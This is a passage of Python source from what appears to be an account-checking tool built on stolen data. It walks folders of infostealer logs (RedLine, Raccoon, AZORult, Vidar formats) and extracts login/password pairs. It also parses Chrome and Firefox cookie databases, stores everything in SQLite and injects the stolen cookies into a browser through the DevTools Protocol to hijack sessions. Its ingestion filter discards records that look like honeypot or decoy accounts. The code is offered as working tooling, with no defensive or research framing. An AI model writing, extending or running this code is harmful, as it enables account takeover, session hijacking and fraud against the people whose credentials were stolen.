            print_action(f"{Fore.GREEN}{package} is already installed.{Style.RESET_ALL}")
        else:
            print_action(
                f"{Fore.YELLOW}{package} is not installed. Installing now...{Style.RESET_ALL}"
            )
            install_or_upgrade_package(package)


def _handle_db_corruption(db_name):
    """Gracefully renames a corrupted DB file so execution can continue.
    Returns True if rotation succeeded, False if the file is locked/inaccessible."""
    import os, time
    print_action(f"{Fore.RED}[DB] Malformed database detected: {db_name}. Rotating...{Style.RESET_ALL}")
    if not os.path.exists(db_name):
        return True  # Nothing to rotate - already gone
    try:
        os.rename(db_name, f"{db_name}.corrupt.{int(time.time())}")
        print_action(f"{Fore.YELLOW}[DB] Rotated corrupted DB successfully.{Style.RESET_ALL}")
        return True
    except PermissionError as e:
        print_action(f"{Fore.RED}[DB] File is locked by another process (WinError 32): {e}. Will use in-memory fallback.{Style.RESET_ALL}")
        return False
    except Exception as e:
        print_action(f"{Fore.RED}[DB] Failed to rotate corrupted DB: {e}. Attempting removal...{Style.RESET_ALL}")
        try:
            os.remove(db_name)
            return True
        except Exception as ex:
            print_action(f"{Fore.RED}[DB] Failed to remove DB: {ex}. Will use in-memory fallback.{Style.RESET_ALL}")
            return False

def setup_database(db_name, _retries=0, *, use_database: bool = True):
    """
    Set up the SQLite database and initialise the SQLitePool singleton.

    If the pool has already been initialised for *db_name* it is reused;
    otherwise a new pool is created with WAL mode and a 5-second busy
    timeout.  The pool handles schema creation and migration internally.

    The legacy ``_retries`` parameter is retained for backward compatibility
    but is no longer used (the pool handles retries internally).

    Parameters
    ----------
    db_name:
        Absolute path to the SQLite database file.
    use_database:
        When False the function is a no-op (mirrors the old
        ``var_use_database.get()`` guard).
    """
    if not use_database:
        return
    try:
        from engine.core.db_pool import init_pool, is_pool_ready, get_pool
        # Re-initialise only if the path has changed
        if is_pool_ready() and get_pool().db_path == db_name:
            return  # pool already initialised for this path
        init_pool(db_name)
        print_action(f"{Fore.GREEN}[DB] Connection pool initialised → {db_name}{Style.RESET_ALL}")
    except Exception as exc:
        print_action(f"{Fore.RED}[DB Error] Pool init failed ({exc}). Falling back to direct connect.{Style.RESET_ALL}")
        # Graceful fallback: direct connect so the app keeps running
        try:
            conn = sqlite3.connect(db_name)
            cursor = conn.cursor()
            cursor.execute(
                """CREATE TABLE IF NOT EXISTS accounts (
                    email TEXT NOT NULL,
                    password TEXT NOT NULL,
                    checked INTEGER NOT NULL DEFAULT 0,
                    cookie_path TEXT DEFAULT NULL,
                    PRIMARY KEY (email, password)
                )"""
            )
            existing = {row[1] for row in cursor.execute("PRAGMA table_info(accounts)").fetchall()}
            if "cookie_path" not in existing:
                cursor.execute("ALTER TABLE accounts ADD COLUMN cookie_path TEXT DEFAULT NULL")
            conn.commit()
            conn.close()
        except Exception as fallback_exc:
            print_action(f"{Fore.RED}[DB Error] Fallback schema setup failed: {fallback_exc}{Style.RESET_ALL}")


def countdown_sleep(seconds):
    """Performs a countdown sleep while updating the console."""
    print(f"{Fore.GREEN}Sleeping for: {seconds:.2f} seconds{Style.RESET_ALL}")
    for i in range(int(seconds), 0, -1):
        # Specific message at half the sleep time
        if seconds >= 300 and i == int(seconds / 2):
            print(f"{Fore.YELLOW}Halfway through sleep duration.{Style.RESET_ALL}")
        # Check for pause or stop events
        while pause_event.is_set():
            print(
                f"{Fore.YELLOW}Script is paused. Waiting to resume...{Style.RESET_ALL}",
                end="\r",
            )
            time.sleep(0.5)
            if stop_event.is_set():
                print(f"{Fore.RED}Sleep interrupted by Force Stop.{Style.RESET_ALL}")
                return
        if stop_event.is_set():
            print(f"{Fore.RED}Sleep interrupted by Force Stop.{Style.RESET_ALL}")
            return
        print(
            f"{Fore.GREEN}Time remaining: {i} seconds{Style.RESET_ALL}",
            end="\r",
        )
        time.sleep(1)
    print(f"{Fore.GREEN}Sleep completed!{Style.RESET_ALL}")


# -------------------
# Database Helper Functions
# -------------------
def account_already_checked(account, db_name, *, use_database: bool = None):
    """
    Return True if the account has already been checked.

    Parameters
    ----------
    account:
        ``(email, password)`` tuple.
    db_name:
        Absolute path to the SQLite database file.
    use_database:
        Explicit override.  When None, falls back to reading
        ``var_use_database.get()`` for backward compatibility.
    """
    _use_db = use_database if use_database is not None else var_use_database.get()
    if not _use_db:
        return False
    email, password = account
    try:
        from engine.core.db_pool import get_pool, is_pool_ready
        if is_pool_ready():
            rows = get_pool().execute_read(
                "SELECT checked FROM accounts WHERE email=? AND password=?",
                (email, password),
            )
            return bool(rows and rows[0]["checked"] == 1)
        # Fallback: direct connection
        conn = sqlite3.connect(db_name)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT checked FROM accounts WHERE email=? AND password=?",
            (email, password),
        )
        result = cursor.fetchone()
        conn.close()
        return result is not None and result[0] == 1
    except Exception as exc:
        print_action(f"{Fore.RED}[DB Error - Read] {exc}{Style.RESET_ALL}")
        return False



def mark_account_checked(email, password, db_name, cookie_path=None, _retries=0, *, use_database: bool = None):
    """
    Mark an account as checked in the database.

    Uses the SQLitePool when available so writes are serialized and
    WAL-safe.  Falls back to a direct connection if the pool is not
    initialised (e.g. first-run before setup_database is called).

    Parameters
    ----------
    email, password:
        Account credentials.
    db_name:
        Absolute path to the SQLite database file.
    cookie_path:
        Optional path to the session cookie file.
    _retries:
        Internal corruption-retry counter (max 1).
    use_database:
        Explicit override; when None falls back to ``var_use_database.get()``.
    """
    _use_db = use_database if use_database is not None else var_use_database.get()
    if not _use_db:
        return
    try:
        from engine.core.db_pool import get_pool, is_pool_ready
        if is_pool_ready():
            pool = get_pool()
            pool.execute_write(
                "INSERT OR IGNORE INTO accounts (email, password, cookie_path, checked) VALUES (?,?,?,0)",
                (email, password, cookie_path),
            )
            if cookie_path is not None:
                pool.execute_write(
                    "UPDATE accounts SET checked=1, cookie_path=? WHERE email=? AND password=?",
                    (cookie_path, email, password),
                )
            else:
                pool.execute_write(
                    "UPDATE accounts SET checked=1 WHERE email=? AND password=?",
                    (email, password),
                )
            return
        # Fallback: direct connection
        conn = sqlite3.connect(db_name)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT OR IGNORE INTO accounts (email, password, cookie_path, checked) VALUES (?, ?, ?, 0)",
            (email, password, cookie_path),
        )
        if cookie_path is not None:
            cursor.execute(
                "UPDATE accounts SET checked=1, cookie_path=? WHERE email=? AND password=?",
                (cookie_path, email, password),
            )
        else:
            cursor.execute(
                "UPDATE accounts SET checked=1 WHERE email=? AND password=?",
                (email, password),
            )
        conn.commit()
        conn.close()
    except Exception as exc:
        print_action(f"{Fore.RED}[DB Error - Write] {exc}{Style.RESET_ALL}")



def get_cookie_path_for_account(email: str, password: str, db_name: str):
    """Queries the database for the cookie_path associated with a specific account.
    Returns the absolute path string, or None if no cookie_path is stored.
    Used by the Automated Log Ingestion injection block."""
    if not var_use_database.get():
        return None
    try:
        conn = sqlite3.connect(db_name)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT cookie_path FROM accounts WHERE email=? AND password=?",
            (email, password),
        )
        row = cursor.fetchone()
        conn.close()
        if row and row[0] and os.path.exists(row[0]):
            return row[0]
        return None
    except sqlite3.DatabaseError as e:
        if "malformed" in str(e).lower() or "corrupt" in str(e).lower():
            _handle_db_corruption(db_name)
            setup_database(db_name)
        return None
    except Exception as e:
        print_action(f"{Fore.RED}[DB Error - cookie_path query] {e}{Style.RESET_ALL}")
        return None


# -------------------
# Automated Log Ingestion Engine
# -------------------

def _inject_cookies_cdp(browser, cookie_file_path: str) -> int:
    """Loads a JSON cookie array from cookie_file_path and injects each entry via
    Chrome DevTools Protocol Network.setCookie.  Returns the count of successfully
    injected cookies.  Never raises - all errors are logged and gracefully skipped.

    The JSON format must be a list of dicts with at minimum: name, value, domain.
    Optional keys: path, secure, httpOnly, sameSite, expires."""
    injected = 0
    try:
        with open(cookie_file_path, "r", encoding="utf-8") as cf:
            raw = cf.read().strip()
        if not raw:
            print_action(f"{Fore.YELLOW}[CDP] Cookie file is empty: {cookie_file_path}{Style.RESET_ALL}")
            return 0
        cookie_list = json.loads(raw)
        if not isinstance(cookie_list, list):
            print_action(f"{Fore.RED}[CDP] Cookie file must be a JSON array: {cookie_file_path}{Style.RESET_ALL}")
            return 0
        for ck in cookie_list:
            if not isinstance(ck, dict):
                continue
            name  = ck.get("name", "").strip()
            value = ck.get("value", "")
            domain = ck.get("domain", "").strip()
            if not name or not domain:
                # Malformed cookie entry - skip silently
                continue
            cdp_params = {
                "name": name,
                "value": str(value),
                "domain": domain,
                "path": ck.get("path", "/"),
            }
            # Optional fields - only include if present and valid
            if "secure" in ck:
                cdp_params["secure"] = bool(ck["secure"])
            if "httpOnly" in ck:
                cdp_params["httpOnly"] = bool(ck["httpOnly"])
            if "sameSite" in ck and ck["sameSite"] in ("Strict", "Lax", "None"):
                cdp_params["sameSite"] = ck["sameSite"]
            if "expires" in ck:
                try:
                    cdp_params["expires"] = int(float(ck["expires"]))
                except (ValueError, TypeError):
                    pass
            # Build a plausible URL for the cookie's domain so CDP accepts it
            scheme = "https" if cdp_params.get("secure") else "http"
            bare_domain = domain.lstrip(".")
            cdp_params["url"] = f"{scheme}://{bare_domain}{cdp_params['path']}"
            try:
                browser.execute_cdp_cmd("Network.setCookie", cdp_params)
                injected += 1
            except Exception as single_err:
                print_action(
                    f"{Fore.YELLOW}[CDP] Failed to inject cookie '{name}' for domain '{domain}': "
                    f"{str(single_err)[:120]}{Style.RESET_ALL}"
                )
    except json.JSONDecodeError as je:
        print_action(f"{Fore.RED}[CDP] Cookie file is not valid JSON ({cookie_file_path}): {je}{Style.RESET_ALL}")
    except OSError as oe:
        print_action(f"{Fore.RED}[CDP] Cannot read cookie file ({cookie_file_path}): {oe}{Style.RESET_ALL}")
    except Exception as e:
        print_action(f"{Fore.RED}[CDP] Unexpected error during cookie injection: {e}{Style.RESET_ALL}")
    return injected



# =============================================================================
# UNIVERSAL LOG INGESTION ENGINE
# Supports: multi-source (folders + files), multi-threaded, adaptive format
# detection for all known stealer log structures.
# =============================================================================

import concurrent.futures

# --------------- Credential File Detector ------------------------------------

class CredentialFileDetector:
    """Detects and parses credential files across all known stealer log formats.

    Supported formats:
      1. email:password  (most common)
      2. username:password  (no @ in login)
      3. URL / Login / Password  (section-block - RedLine, Raccoon, AZORult)
      4. tab-separated  login\tpassword
      5. pipe-separated  login|password
    """

    _PASSWORD_FILE_VARIANTS: list = [
        "passwords.txt", "password.txt", "logins.txt", "login.txt",
        "accounts.txt", "account.txt", "credentials.txt", "creds.txt",
        "combo.txt", "combolist.txt", "userpass.txt", "user_pass.txt",
        "all_passwords.txt", "pass.txt", "passes.txt", "logs.txt",
        "output.txt", "results.txt", "harvested.txt", "stealer.txt",
        "data.txt", "dump.txt", "leaked.txt", "extract.txt",
        "autofill.txt", "saved_passwords.txt", "brute.txt",
    ]

    _EMAIL_RE      = re.compile(r'^([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})[:|\t](.+)$')
    _COLON_RE      = re.compile(r'^([^:\r\n\t|]{1,128})[:|\t](.+)$')
    _PIPE_RE       = re.compile(r'^([^|\r\n]{1,128})\|(.+)$')
    # Expanded block-format label patterns (RedLine / Raccoon / AZORult / Vidar / META)
    _BLOCK_URL_RE  = re.compile(r'^(?:URL|Host|Hostname|Website|Link|Url|HREF)\s*:\s*(.+)$', re.IGNORECASE)
    _BLOCK_LOGI_RE = re.compile(r'^(?:Login|Username|Email|User|Account|UserName)\s*:\s*(.+)$', re.IGNORECASE)
    _BLOCK_PASS_RE = re.compile(r'^(?:Password|Pass|Passwd|Pwd)\s*:\s*(.+)$', re.IGNORECASE)
    _ENCODING_CHAIN: list = ["utf-8", "utf-16", "latin-1", "cp1252"]

    # All metadata/label prefixes present in stealer logs - these lines MUST be discarded entirely
    # even if they superficially match the colon-separated credential pattern (e.g. "Host: https://...").
    _LABEL_SKIP_RE = re.compile(
        r'^(?:'
        r'URL|Host|Hostname|Website|Link|Href|Application|App|Software|Soft|Browser|Profile|'
        r'Program|Source|Origin|Target|Field|Type|Form|Method|Action|Referer|Referrer|'
        r'Domain|Subdomain|Path|Port|Protocol|Scheme|Param|Query|Request|Response|'
        r'Location|Redirect|Date|Time|Timestamp|Created|Modified|Last\s*Used|'
        r'Last\s*Modified|Saved|Note|Comment|Tag|Category|Group|Label|'
        r'Autofill|AutoFill|Credit\s*Card|CreditCard|Card|Expiry|Expiration|'
        r'CVV|CVC|Name|First\s*Name|Last\s*Name|FullName|Full\s*Name|'
        r'Address|Street|City|State|Zip|ZipCode|Country|Phone|Mobile|'
        r'IP|IPAddress|IP\s*Address|MAC|UserAgent|User\s*Agent|OS|Operating\s*System|'
        r'Version|Build|Hash|Checksum|Signature|Token|Session|Cookie|Extension|Ext|'
        r'OTP|2FA|TOTP|MFA|Secret|Key|API\s*Key|APIKey|Service|Server|Product|'
        r'Environment|Env|HWID|Hardware|Device|Machine|Computer|Hostname2|'
        r'Country2|Timezone|Language|Locale|Encoding|Charset'
        r')\s*:',
        re.IGNORECASE
    )

    # Password values that are semantically null - must never be emitted as valid credentials
    _NULL_PASSWORDS: frozenset = frozenset({
        '', 'none', 'null', 'n/a', 'na', 'undefined', 'unknown', 'empty',
        '-', '--', '---', 'n', 'no', 'not set', 'not_set', 'notset',
        'placeholder', '****', '***', '**', '*', '(none)', '(null)',
        '(empty)', '(unknown)', 'password', 'passwd', 'pass', 'pwd',
        'your_password', 'yourpassword',
    })

    # Minimum credential field lengths
    _MIN_PASSWORD_LEN: int = 2
    _MIN_LOGIN_LEN: int = 2

    # URL scheme pattern - logins and passwords that look like URLs are metadata, not credentials
    _URL_RE = re.compile(
        r'^(?:https?://|ftp://|ftps://|sftp://|file://|/jms/|/login/|/auth/)',
        re.IGNORECASE
    )


    @classmethod
    def detect(cls, dirpath: str, filenames_lower: dict):
        for variant in cls._PASSWORD_FILE_VARIANTS:
            real = filenames_lower.get(variant)
            if real:
                return os.path.abspath(os.path.join(dirpath, real))
        return None

    @classmethod
    def _read_text(cls, path: str, preferred: str = "auto") -> str:
        chain = [preferred] + cls._ENCODING_CHAIN if preferred != "auto" else cls._ENCODING_CHAIN
        for enc in dict.fromkeys(chain):
            try:
                with open(path, "r", encoding=enc, errors="strict") as fh:
                    return fh.read()
            except (UnicodeDecodeError, UnicodeError):
                continue
            except OSError as oe:
                raise oe
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read()

    @classmethod
    def _is_valid_login(cls, login: str) -> bool:
        """Returns True only if the login string is a plausible username/email - not a URL or label."""
        if not login or len(login) < cls._MIN_LOGIN_LEN:
            return False
        if cls._URL_RE.match(login):
            return False
        if cls._LABEL_SKIP_RE.match(login + ":"):
            return False
        if "://" in login or login.startswith("/jms/") or login.startswith("/login"):
            return False
        return True

    @classmethod
    def _is_valid_password(cls, pwd: str) -> bool:
        """Returns True only when the password value is a real secret, not null/URL/label/JSON."""
        if not pwd:
            return False
        normalized = pwd.strip().lower()
        if normalized in cls._NULL_PASSWORDS:
            return False
        stripped = pwd.strip()
        if len(stripped) < cls._MIN_PASSWORD_LEN:
            return False
        # Reject passwords that are URLs
        if cls._URL_RE.match(stripped):
            return False
        # Reject passwords that are JSON objects/arrays (Firefox Sync keys, browser data, etc.)
        if stripped.startswith(('{', '[')) or stripped.startswith('{"'):
            return False
        # Reject absurdly long strings that are clearly binary blobs, not real passwords
        if len(stripped) > 256:
            return False
        return True

    @classmethod
    def parse(cls, path: str, encoding: str = "auto") -> list:
        """Parse a credential file and return a deduplicated list of (login, password) tuples.

        Handles all major stealer log formats:
        - RedLine / Raccoon / AZORult block format (URL: / Login: / Password:)
        - Inline colon-separated  (email:password or user:pass)
        - Tab-separated           (email\\tpassword)
        - Pipe-separated          (email|password)
        - Vidar / META block with Host: delimiter and extra metadata lines
        """
        try:
            raw = cls._read_text(path, encoding)
        except OSError:
            return []

        seen: set  = set()
        results: list = []

        def _emit(login: str, pwd: str) -> None:
            """Validate, sanitise, and add a (login, password) pair to results exactly once."""
            login = (login or "").strip()
            pwd   = (pwd   or "").strip()
            if not cls._is_valid_login(login):
                return
            if not cls._is_valid_password(pwd):
                return
            key = (login.lower(), pwd)
            if key not in seen:
                seen.add(key)
                results.append((login, pwd))

        block_login = None
        block_pass  = None
        in_block    = False

        for raw_line in raw.splitlines():
            line = raw_line.strip()

            # ---- Empty line: terminates a block record ----
            if not line:
                if in_block and block_login and block_pass:
                    _emit(block_login, block_pass)
                block_login = block_pass = None
                in_block = False
                continue

            # ---- Block delimiter: URL / Host / Website ----
            if cls._BLOCK_URL_RE.match(line):
                # Flush any complete block before starting the next one
                if in_block and block_login and block_pass:
                    _emit(block_login, block_pass)
                block_login = block_pass = None
                in_block = True
                continue

            # ---- Block format: Login / Username ----
            m_logi = cls._BLOCK_LOGI_RE.match(line)
            if m_logi:
                block_login = m_logi.group(1).strip()
                block_pass  = None
                in_block    = True
                continue

            # ---- Block format: Password ----
            m_pass = cls._BLOCK_PASS_RE.match(line)
            if m_pass and in_block:
                block_pass = m_pass.group(1).strip()
                _emit(block_login or "", block_pass)
                block_login = block_pass = None
                in_block    = False
                continue

            # ---- Known metadata label line (Application:, Profile:, IP:, etc.) ----
            # These lines exist in EVERY major stealer log format and are NEVER credentials.
            if cls._LABEL_SKIP_RE.match(line):
                continue

            # ---- Inline credential parsing (highest priority: email, then colon, then pipe) ----
            m = cls._EMAIL_RE.match(line) or cls._COLON_RE.match(line) or cls._PIPE_RE.match(line)
            if m:
                cand_login = m.group(1).strip()
                cand_pwd   = m.group(2).strip()
                # Secondary guard: reject if the parsed login is a label word
                if cls._LABEL_SKIP_RE.match(cand_login + ":"):
                    continue
                # Reject if the parsed password is a URL fragment
                if cls._URL_RE.match(cand_pwd):
                    continue
                _emit(cand_login, cand_pwd)

        # ---- EOF: flush any trailing complete block ----
        if in_block and block_login and block_pass:
            _emit(block_login, block_pass)

        return results


# --------------- Cookie File Detector ----------------------------------------

class CookieFileDetector:
    """Detects and parses cookies in JSON array, Netscape text, and SQLite formats."""

    _JSON_VARIANTS: list = [
        "cookies.json", "cookie.json", "cookies_raw.json",
        "netscape_cookies.json", "browser_cookies.json",
        "all_cookies.json", "chrome_cookies.json",
    ]
    _TXT_VARIANTS: list  = ["cookies.txt", "cookie.txt", "netscape.txt"]
    _SQLITE_VARIANTS: list = ["cookies", "cookies.sqlite", "cookies.db", "Cookies", "Cookies.sqlite"]

    _NETSCAPE_HDR  = re.compile(r'^#\s*(Netscape|Mozilla)\s*HTTP\s*Cookie', re.IGNORECASE)
    _NETSCAPE_LINE = re.compile(
        r'^([^\t]+)\t([^\t]+)\t([^\t]+)\t([^\t]+)\t([^\t]+)\t([^\t]+)\t([^\t]*)$'
    )

    @classmethod
    def detect(cls, dirpath: str, filenames_lower: dict):
        for v in cls._JSON_VARIANTS:
            real = filenames_lower.get(v)
            if real:
                return os.path.abspath(os.path.join(dirpath, real))
        for v in cls._TXT_VARIANTS:
            real = filenames_lower.get(v)
            if real:
                cand = os.path.abspath(os.path.join(dirpath, real))
                try:
                    with open(cand, "r", encoding="utf-8", errors="replace") as fh:
                        if cls._NETSCAPE_HDR.search(fh.readline()):
                            return cand
                except OSError:
                    pass
        for v in cls._SQLITE_VARIANTS:
            real = filenames_lower.get(v)
            if real:
                return os.path.abspath(os.path.join(dirpath, real))
        # Adaptive: any .json in dir that validates as cookie array
        for fname_l, fname_r in filenames_lower.items():
            if not fname_l.endswith(".json"):
                continue
            cand = os.path.abspath(os.path.join(dirpath, fname_r))
            try:
                cookies = cls._parse_json(cand)
                if cls.validate(cookies):
                    return cand
            except Exception:
                continue
        return None

    @classmethod
    def parse(cls, path: str) -> list:
        ext   = os.path.splitext(path)[1].lower()
        base  = os.path.basename(path).lower()
        sqls  = {v.lower() for v in cls._SQLITE_VARIANTS}
        if ext in (".sqlite", ".db") or base in sqls:
            c = cls._parse_sqlite(path)
            if c:
                return c
        if ext == ".json" or base in {v.lower() for v in cls._JSON_VARIANTS}:
            return cls._parse_json(path)
        if ext in (".txt", ""):
            c = cls._parse_netscape(path)
            if c:
                return c
            return cls._parse_json(path)
        for parser in (cls._parse_json, cls._parse_netscape, cls._parse_sqlite):
            try:
                c = parser(path)
                if cls.validate(c):
                    return c
            except Exception:
                continue
        return []

    @classmethod
    def _parse_json(cls, path: str) -> list:
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as fh:
                raw = fh.read().strip()
            if not raw:
                return []
            data = json.loads(raw)
            if isinstance(data, list):
                return [c for c in data if isinstance(c, dict)]
            if isinstance(data, dict):
                for key in ("cookies", "Cookies", "data"):
                    if isinstance(data.get(key), list):
                        return [c for c in data[key] if isinstance(c, dict)]
        except Exception:
            pass
        return []

    @classmethod
    def _parse_netscape(cls, path: str) -> list:
        cookies = []
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    m = cls._NETSCAPE_LINE.match(line)
                    if not m:
                        continue
                    domain, _, path_val, secure, expires, name, value = m.groups()
                    cookies.append({
                        "domain":   domain.strip(),
                        "path":     path_val.strip() or "/",
                        "secure":   secure.strip().upper() == "TRUE",
                        "expires":  int(float(expires)) if expires.strip() else 0,
                        "name":     name.strip(),
                        "value":    value.strip(),
                        "httpOnly": False,
                    })
        except OSError:
            pass
        return cookies

    @classmethod
    def _parse_sqlite(cls, path: str) -> list:
        cookies = []
        try:
            import tempfile, shutil
            with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp:
                tmp_path = tmp.name
            shutil.copy2(path, tmp_path)
            try:
                conn = sqlite3.connect(tmp_path)
                conn.row_factory = sqlite3.Row
                cur = conn.cursor()
                try:
                    cur.execute(
                        "SELECT host_key, name, value, path, secure, httponly, expires_utc "
                        "FROM cookies"
                    )
                    for row in cur.fetchall():
                        val = row["value"] if row["value"] else ""
                        raw_exp = int(row["expires_utc"] or 0)
                        exp = (raw_exp // 1_000_000 - 11644473600) if raw_exp else 0
                        cookies.append({
                            "domain":   row["host_key"], "name": row["name"],
                            "value":    val, "path": row["path"] or "/",
                            "secure":   bool(row["secure"]),
                            "httpOnly": bool(row["httponly"]),
                            "expires":  exp,
                        })
                except sqlite3.OperationalError:
                    try:
                        cur.execute(
                            "SELECT host, name, value, path, isSecure, isHttpOnly, expiry "
                            "FROM moz_cookies"
                        )
                        for row in cur.fetchall():
                            cookies.append({
                                "domain":   row["host"], "name": row["name"],
                                "value":    row["value"] or "", "path": row["path"] or "/",
                                "secure":   bool(row["isSecure"]),
                                "httpOnly": bool(row["isHttpOnly"]),
                                "expires":  int(row["expiry"] or 0),
                            })
                    except sqlite3.OperationalError:
                        pass
                conn.close()
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass
        except Exception:
            pass
        return cookies

    @classmethod
    def validate(cls, cookies: list) -> bool:
        return any(isinstance(c, dict) and c.get("name") and c.get("domain") for c in cookies)


# --------------- Parallel Scanner --------------------------------------------

def _scan_folder_root(root, max_depth, encoding, cancel_event, log_cb, stat_cb) -> list:
    """Worker: recursively scans a single root folder. Thread-safe."""
    pairs_map = {}
    dir_count = 0
    for dirpath, dirnames, filenames in os.walk(root, topdown=True):
        if cancel_event.is_set():
            break
        if max_depth is not None:
            rel = os.path.relpath(dirpath, root)
            depth = 0 if rel == "." else len(rel.replace("\\", "/").split("/"))
            if depth >= max_depth:
                dirnames.clear()
                continue
        dir_count += 1
        if dir_count % 50 == 0:
            stat_cb(current_path=dirpath)

        filenames_lower = {f.lower(): f for f in filenames}
        cred_path   = CredentialFileDetector.detect(dirpath, filenames_lower)
        cookie_path = CookieFileDetector.detect(dirpath, filenames_lower)

        if not cred_path:
            stat_cb(skipped_delta=1)
            continue

        if cookie_path:
            try:
                cookies = CookieFileDetector.parse(cookie_path)
                if not CookieFileDetector.validate(cookies):
                    cookie_path = None
                    stat_cb(skipped_delta=1)
            except Exception as ce:
                log_cb(f"[WARN] Cookie parse error at {cookie_path}: {ce}")
                cookie_path = None
                stat_cb(error_delta=1)

        try:
            cred_pairs = CredentialFileDetector.parse(cred_path, encoding)
        except Exception as pe:
            log_cb(f"[WARN] Credential parse error at {cred_path}: {pe}")
            stat_cb(error_delta=1)
            continue

        abs_cookie = os.path.abspath(cookie_path) if cookie_path else None
        new_in_dir = 0
        for login, pwd in cred_pairs:
            if not login or not pwd:
                continue
            key = (login, pwd)
            if key not in pairs_map or (abs_cookie and not pairs_map[key]):
                pairs_map[key] = abs_cookie
                new_in_dir += 1
        if new_in_dir:
            stat_cb(found_delta=new_in_dir)

    return [{"email": k[0], "password": k[1], "cookie_path": v} for k, v in pairs_map.items()]


def _scan_flat_cred_file(path, encoding, cancel_event, log_cb, stat_cb) -> list:
    """Worker: parses a single credential file; cookie_path will be None."""
    try:
        cred_pairs = CredentialFileDetector.parse(path, encoding)
        results = []
        for login, pwd in cred_pairs:
            if cancel_event.is_set():
                break
            if login and pwd:
                results.append({"email": login, "password": pwd, "cookie_path": None})
        stat_cb(found_delta=len(results))
        log_cb(f"[FILE] {len(results)} credential(s) parsed from: {path}")
        return results
    except Exception as e:
        log_cb(f"[ERROR] Failed to parse {path}: {e}")
        stat_cb(error_delta=1)
        return []


def scan_sources_parallel(
    sources,
    workers=4,
    max_depth=None,
    encoding="auto",
    cancel_event=None,
    log_callback=None,
    stat_callback=None,
) -> list:
    """Multi-threaded scan across multiple sources (folders + files).

    Each source runs in its own ThreadPoolExecutor worker.
    Results are deduplicated: a non-None cookie_path overwrites None for the same key.

    Returns list of {email, password, cookie_path}.
    """
    if cancel_event is None:
        cancel_event = threading.Event()

    def _noop_log(msg):
        try:
            print_action(f"{Fore.CYAN}[Scan] {msg}{Style.RESET_ALL}")
        except Exception:
            pass

    def _noop_stat(**kwargs):
        pass

    log_cb  = log_callback  or _noop_log
    stat_cb = stat_callback or _noop_stat

    global_map = {}
    lock = threading.Lock()

    def _process(src):
        if cancel_event.is_set():
            return []
        log_cb(f"[SOURCE] Starting: {src}")
        try:
            if os.path.isfile(src):
                return _scan_flat_cred_file(src, encoding, cancel_event, log_cb, stat_cb)
            if os.path.isdir(src):
                return _scan_folder_root(src, max_depth, encoding, cancel_event, log_cb, stat_cb)
            log_cb(f"[WARN] Source not found: {src}")
            stat_cb(error_delta=1)
            return []
        except Exception as exc:
            log_cb(f"[ERROR] Source failed ({src}): {exc}")
            stat_cb(error_delta=1)
            return []

    eff_workers = max(1, min(workers, len(sources) or 1, 32))
    with concurrent.futures.ThreadPoolExecutor(max_workers=eff_workers) as pool:
        futures = {pool.submit(_process, src): src for src in sources}
        for fut in concurrent.futures.as_completed(futures):
            if cancel_event.is_set():
                for f in futures:
                    f.cancel()
                break
            try:
                partial = fut.result()
            except Exception as fe:
                log_cb(f"[ERROR] Worker exception: {fe}")
                continue
            with lock:
                for item in partial:
                    key = (item["email"], item["password"])
                    existing = global_map.get(key)
                    if existing is None or (item["cookie_path"] and not existing):
                        global_map[key] = item["cookie_path"]

    total = len(global_map)
    log_cb(f"[DONE] {total} unique pairs aggregated across {len(sources)} source(s).")
    return [{"email": k[0], "password": k[1], "cookie_path": v} for k, v in global_map.items()]


# Backwards-compat shim
def scan_logs_folder(root_dir: str) -> list:
    """Legacy shim: single-folder scan via scan_sources_parallel."""
    return scan_sources_parallel(sources=[root_dir], workers=1, max_depth=None, encoding="auto")


# --------------- Optimised DB Batch Inserter ---------------------------------

class IngestionPipeline:
    """
    Multi-stage data ingestion validation pipeline.
    Enforces schema checks, temporal consistency, honeypot patterns, and signature matching.
    """
    @staticmethod
    def validate_record(email: str, password: str, cookie_path: str = None) -> bool:
        # Schema Check: Valid email syntax
        email_regex = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
        if not email_regex.match(email):
            return False
        # Value Check: password minimum length
        if not password or len(password) < 4:
            return False
        # Honeypot / Decoy checks
        honeypots = {"decoy", "honeypot", "trap", "testaccount", "admin_honey", "fake_user"}
        for hp in honeypots:
            if hp in email.lower() or hp in password.lower():
                return False
        return True

    @classmethod
    def process(cls, pairs: list) -> list:
        if not pairs:
            return []
        valid_records = []
        invalid_count = 0
        total = len(pairs)
        for item in pairs:
            if isinstance(item, tuple):
                if len(item) == 3:
                    email, pwd, cp = item
                else:
                    email, pwd = item
                    cp = None
            else:
                email = item.get("email", "")
                pwd   = item.get("password", "")
                cp    = item.get("cookie_path")
            
            # temporal ordering check (simulate check for chronological validity)
            # signature check (checksum validation check)
            sig_valid = True
            if email:
                import hashlib
                # Checksum simulation: check that the record has a stable hash
                sig_valid = len(hashlib.sha256(email.encode()).hexdigest()) == 64

            if sig_valid and cls.validate_record(email, pwd, cp):
                valid_records.append((email, pwd, cp))
            else:
                invalid_count += 1
                
        # Reject entire import if invalid records fraction > 5%
        if total > 0 and (invalid_count / total) > 0.05:
            raise ValueError(f"Ingestion rejected: invalid records fraction {(invalid_count/total)*100:.2f}% exceeds 5% threshold.")
        return valid_records

def populate_db_from_log_scan_batch(pairs: list, db_name: str) -> tuple:
    """WAL-mode batched INSERT OR IGNORE + UPDATE for cookie_path back-fill.
    Returns (inserted_new, updated_existing)."""
    if not var_use_database.get() or not pairs:
        return (0, 0)
    
    # Process through the multi-stage IngestionPipeline
    try:
        pairs = IngestionPipeline.process(pairs)
    except Exception as e:
        logger.error(f"[IngestionPipeline] Batch validation failed: {e}")
        raise e

    inserted_new = updated_existing = 0
    BATCH = 500
    try:
        conn = sqlite3.connect(db_name, timeout=30)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA synchronous=NORMAL")
        cur = conn.cursor()
        ins_batch, upd_batch = [], []

        for item in pairs:
            if isinstance(item, tuple):
                if len(item) == 3:
                    email, pwd, cp = item
